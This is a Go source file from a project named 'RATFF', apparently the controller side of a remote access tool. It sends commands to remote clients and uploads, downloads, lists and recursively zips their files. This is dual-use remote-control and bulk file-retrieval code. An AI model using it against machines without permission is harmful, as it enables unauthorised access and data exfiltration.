package main

import (
	"archive/zip"
	"bytes"
	"crypto/md5"
	"encoding/base64"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"os"
	"path/filepath"
	"time"

	"RATFF/shared"
)

const (
	chunkSize       = 64 * 1024
	uploadTimeout   = 10 * time.Second
	chunkTimeout    = 30 * time.Second
	downloadTimeout = 10 * time.Second
)

func sendFileCommandRaw(token, pathPrefix, clientID string, cmdType shared.CommandType, payload map[string]interface{}, timeout time.Duration) (*shared.Message, error) {

	ch := make(chan shared.Message, 1)
	pendingMu.Lock()
	pendingCmd[clientID] = append(pendingCmd[clientID], &pendingCommand{ch: ch})
	pendingMu.Unlock()

	msg := shared.NewMessage(shared.MsgCommand, cmdType, clientID, payload)
	data, err := json.Marshal(msg)
	if err != nil {
		cleanupPending(clientID)
		return nil, fmt.Errorf("marshal command: %w", err)
	}

	_, err = ensureResponseConn(pathPrefix)
	if err != nil {
		cleanupPending(clientID)
		return nil, fmt.Errorf("websocket not connected: %w", err)
	}

	commandURL := buildAPIURL(pathPrefix, "/api/command")
	httpReq, err := http.NewRequest("POST", commandURL, bytes.NewBuffer(data))
	if err != nil {
		cleanupPending(clientID)
		return nil, fmt.Errorf("create request: %w", err)
	}
	httpReq.Header.Set("Content-Type", "application/json")
	if token != "" {
		httpReq.Header.Set("Authorization", "Bearer "+token)
	}

	resp, err := http.DefaultClient.Do(httpReq)
	if err != nil {
		cleanupPending(clientID)
		return nil, fmt.Errorf("send command: %w", err)
	}
	defer resp.Body.Close()

	select {
	case responseMsg := <-ch:
		cleanupPending(clientID)

		if responseMsg.Payload != nil {
			if errMsg, ok := responseMsg.Payload["error"].(string); ok {
				return nil, fmt.Errorf("%s", errMsg)
			}
		}
		return &responseMsg, nil
	case <-time.After(timeout):
		cleanupPending(clientID)
		return nil, fmt.Errorf("command timed out after %v", timeout)
	}
}

func uploadSingleFile(token, pathPrefix, clientID, localPath, remotePath string, task *TransferTask) error {
	file, err := os.Open(localPath)
	if err != nil {
		return fmt.Errorf("open file: %w", err)
	}
	defer file.Close()

	fileInfo, err := file.Stat()
	if err != nil {
		return fmt.Errorf("stat file: %w", err)
	}
	fileSize := fileInfo.Size()
	totalChunks := (fileSize + chunkSize - 1) / chunkSize
	fileID := shared.GenerateID()

	filename := filepath.Base(localPath)
	if remotePath == "" || remotePath == "." {
		remotePath = filename
	}

	startPayload := map[string]interface{}{
		"file_id":      fileID,
		"remote_path":  remotePath,
		"file_size":    fileSize,
		"chunk_size":   chunkSize,
		"total_chunks": totalChunks,
	}

	_, err = sendFileCommandRaw(token, pathPrefix, clientID, shared.CmdFileUploadStart, startPayload, uploadTimeout)
	if err != nil {
		return fmt.Errorf("upload start: %w", err)
	}

	md5hash := md5.New()

	for i := 0; i < int(totalChunks); i++ {
		chunk := make([]byte, chunkSize)
		n, readErr := file.Read(chunk)
		if readErr != nil && readErr != io.EOF {
			return fmt.Errorf("read chunk %d: %w", i, readErr)
		}
		if n == 0 {
			break
		}

		chunkData := chunk[:n]
		md5hash.Write(chunkData)
		chunkB64 := base64.StdEncoding.EncodeToString(chunkData)

		chunkPayload := map[string]interface{}{
			"file_id":     fileID,
			"chunk_index": i,
			"chunk_data":  chunkB64,
		}

		_, err = sendFileCommandRaw(token, pathPrefix, clientID, shared.CmdFileUploadChunk, chunkPayload, chunkTimeout)
		if err != nil {
			return fmt.Errorf("upload chunk %d: %w", i, err)
		}

		if task != nil {
			task.SentBytes += int64(n)
			task.updateProgress()
		}
	}

	completePayload := map[string]interface{}{
		"file_id": fileID,
	}

	msg, err := sendFileCommandRaw(token, pathPrefix, clientID, shared.CmdFileUploadComplete, completePayload, uploadTimeout)
	if err != nil {
		return fmt.Errorf("upload complete: %w", err)
	}

	if msg != nil && msg.Payload != nil {
		if remoteMD5, ok := msg.Payload["md5"].(string); ok {
			localMD5 := hex.EncodeToString(md5hash.Sum(nil))
			if remoteMD5 != localMD5 {
				return fmt.Errorf("md5 mismatch: local=%s remote=%s", localMD5, remoteMD5)
			}
		}
	}

	return nil
}

func downloadSingleFile(token, pathPrefix, clientID, remotePath, localPath string, task *TransferTask) error {
	fileID := shared.GenerateID()

	startPayload := map[string]interface{}{
		"file_id":    fileID,
		"local_path": remotePath,
	}

	msg, err := sendFileCommandRaw(token, pathPrefix, clientID, shared.CmdFileDownloadStart, startPayload, downloadTimeout)
	if err != nil {
		return fmt.Errorf("download start: %w", err)
	}

	if msg.Payload == nil {
		return fmt.Errorf("download start: empty payload")
	}

	fileSizeF, _ := msg.Payload["file_size"].(float64)
	fileSize := int64(fileSizeF)
	totalChunksF, _ := msg.Payload["total_chunks"].(float64)
	totalChunks := int(totalChunksF)

	if err := os.MkdirAll(filepath.Dir(localPath), 0755); err != nil {
		return fmt.Errorf("create dir: %w", err)
	}

	outFile, err := os.Create(localPath)
	if err != nil {
		return fmt.Errorf("create file: %w", err)
	}
	defer outFile.Close()

	md5hash := md5.New()

	for i := 0; i < totalChunks; i++ {
		chunkPayload := map[string]interface{}{
			"file_id":     fileID,
			"chunk_index": i,
		}

		chunkMsg, err := sendFileCommandRaw(token, pathPrefix, clientID, shared.CmdFileDownloadChunk, chunkPayload, chunkTimeout)
		if err != nil {
			return fmt.Errorf("download chunk %d: %w", i, err)
		}

		if chunkMsg.Payload == nil {
			return fmt.Errorf("download chunk %d: empty payload", i)
		}

		chunkDataB64, _ := chunkMsg.Payload["chunk_data"].(string)
		chunkData, err := base64.StdEncoding.DecodeString(chunkDataB64)
		if err != nil {
			return fmt.Errorf("decode chunk %d: %w", i, err)
		}

		n, err := outFile.Write(chunkData)
		if err != nil {
			return fmt.Errorf("write chunk %d: %w", i, err)
		}

		md5hash.Write(chunkData[:n])

		if task != nil {
			task.SentBytes += int64(n)
			task.updateProgress()
		}
	}

	completePayload := map[string]interface{}{
		"file_id": fileID,
	}

	completeMsg, err := sendFileCommandRaw(token, pathPrefix, clientID, shared.CmdFileDownloadComplete, completePayload, downloadTimeout)
	if err != nil {
		return fmt.Errorf("download complete: %w", err)
	}

	if completeMsg != nil && completeMsg.Payload != nil {
		if remoteMD5, ok := completeMsg.Payload["md5"].(string); ok {
			localMD5 := hex.EncodeToString(md5hash.Sum(nil))
			if remoteMD5 != localMD5 {
				return fmt.Errorf("md5 mismatch: local=%s remote=%s", localMD5, remoteMD5)
			}
		}
	}

	if fileSize > 0 {
		info, err := os.Stat(localPath)
		if err == nil && info.Size() != fileSize {
			return fmt.Errorf("size mismatch: expected=%d got=%d", fileSize, info.Size())
		}
	}

	return nil
}

func isRemoteDirectory(token, pathPrefix, clientID, remotePath string) (bool, error) {
	payload := map[string]interface{}{"path": remotePath}
	msg, err := sendFileCommandRaw(token, pathPrefix, clientID, shared.CmdFileList, payload, downloadTimeout)
	if err != nil {
		return false, err
	}
	if msg.Payload == nil {
		return false, fmt.Errorf("empty list response")
	}
	if errMsg, ok := msg.Payload["error"].(string); ok {
		return false, fmt.Errorf("%s", errMsg)
	}
	_, isArray := msg.Payload["files"].([]interface{})
	return isArray, nil
}

func listRemoteDir(token, pathPrefix, clientID, remotePath string) ([]map[string]interface{}, error) {
	payload := map[string]interface{}{"path": remotePath}
	msg, err := sendFileCommandRaw(token, pathPrefix, clientID, shared.CmdFileList, payload, downloadTimeout)
	if err != nil {
		return nil, err
	}
	if msg.Payload == nil {
		return nil, fmt.Errorf("empty list response")
	}
	filesRaw, ok := msg.Payload["files"].([]interface{})
	if !ok {
		return nil, fmt.Errorf("invalid file list response")
	}
	var files []map[string]interface{}
	for _, f := range filesRaw {
		if fm, ok := f.(map[string]interface{}); ok {
			files = append(files, fm)
		}
	}
	return files, nil
}

func walkRemoteDir(token, pathPrefix, clientID, basePath, currentPath string) ([]string, error) {
	var allFiles []string
	files, err := listRemoteDir(token, pathPrefix, clientID, currentPath)
	if err != nil {
		return nil, err
	}
	for _, f := range files {
		name, _ := f["name"].(string)
		if name == "" {
			continue
		}
		fullPath := filepath.Join(currentPath, name)
		fullPath = filepath.ToSlash(fullPath)
		isDir, _ := f["is_dir"].(bool)
		if isDir {
			subFiles, err := walkRemoteDir(token, pathPrefix, clientID, basePath, fullPath)
			if err != nil {
				return nil, err
			}
			allFiles = append(allFiles, subFiles...)
		} else {
			allFiles = append(allFiles, fullPath)
		}
	}
	return allFiles, nil
}

func downloadDirectory(token, pathPrefix, clientID, remotePath string, task *TransferTask) (string, error) {
	files, err := walkRemoteDir(token, pathPrefix, clientID, remotePath, remotePath)
	if err != nil {
		return "", fmt.Errorf("walk remote dir: %w", err)
	}
	if len(files) == 0 {
		return "", fmt.Errorf("empty directory")
	}

	task.FileCount = len(files)

	tmpDir, err := os.MkdirTemp("", "ratff_download_*")
	if err != nil {
		return "", fmt.Errorf("create temp dir: %w", err)
	}
	defer os.RemoveAll(tmpDir)

	for i, remoteFile := range files {
		relPath, err := filepath.Rel(remotePath, remoteFile)
		if err != nil {
			return "", fmt.Errorf("relative path: %w", err)
		}
		localFile := filepath.Join(tmpDir, relPath)

		task.FileIndex = i + 1
		task.FileName = filepath.Base(remoteFile)
		task.updateProgress()

		if err := downloadSingleFile(token, pathPrefix, clientID, remoteFile, localFile, task); err != nil {
			return "", fmt.Errorf("download %s: %w", relPath, err)
		}
	}

	zipFile, err := os.CreateTemp("", "ratff_zip_*.zip")
	if err != nil {
		return "", fmt.Errorf("create zip: %w", err)
	}

	zipWriter := zip.NewWriter(zipFile)

	walkErr := filepath.Walk(tmpDir, func(path string, info os.FileInfo, err error) error {
		if err != nil {
			return err
		}
		if info.IsDir() {
			return nil
		}
		relPath, err := filepath.Rel(tmpDir, path)
		if err != nil {
			return err
		}
		relPath = filepath.ToSlash(relPath)

		w, err := zipWriter.Create(relPath)
		if err != nil {
			return err
		}

		src, err := os.Open(path)
		if err != nil {
			return err
		}

		_, err = io.Copy(w, src)
		src.Close()
		return err
	})

	if walkErr != nil {
		_ = zipWriter.Close()
		_ = zipFile.Close()
		if rmErr := os.Remove(zipFile.Name()); rmErr != nil {
			log.WithError(rmErr).Warn("Failed to remove incomplete zip file")
		}
		return "", fmt.Errorf("create zip archive: %w", walkErr)
	}

	if err := zipWriter.Close(); err != nil {
		_ = zipFile.Close()
		if rmErr := os.Remove(zipFile.Name()); rmErr != nil {
			log.WithError(rmErr).Warn("Failed to remove failed zip file")
		}
		return "", fmt.Errorf("close zip: %w", err)
	}

	if err := zipFile.Close(); err != nil {
		if rmErr := os.Remove(zipFile.Name()); rmErr != nil {
			log.WithError(rmErr).Warn("Failed to remove failed zip file")
		}
		return "", fmt.Errorf("finalize zip: %w", err)
	}

	return zipFile.Name(), nil
}

func uploadDirectory(token, pathPrefix, clientID, localDir, remoteDir string, task *TransferTask) error {
	err := filepath.Walk(localDir, func(path string, info os.FileInfo, err error) error {
		if err != nil {
			return err
		}
		if info.IsDir() {
			return nil
		}

		relPath, err := filepath.Rel(localDir, path)
		if err != nil {
			return fmt.Errorf("relative path: %w", err)
		}
		remotePath := filepath.ToSlash(filepath.Join(remoteDir, relPath))

		task.FileIndex++
		task.FileName = filepath.Base(path)
		task.updateProgress()

		if err := uploadSingleFile(token, pathPrefix, clientID, path, remotePath, task); err != nil {
			return fmt.Errorf("upload %s: %w", relPath, err)
		}

		return nil
	})
	return err
}
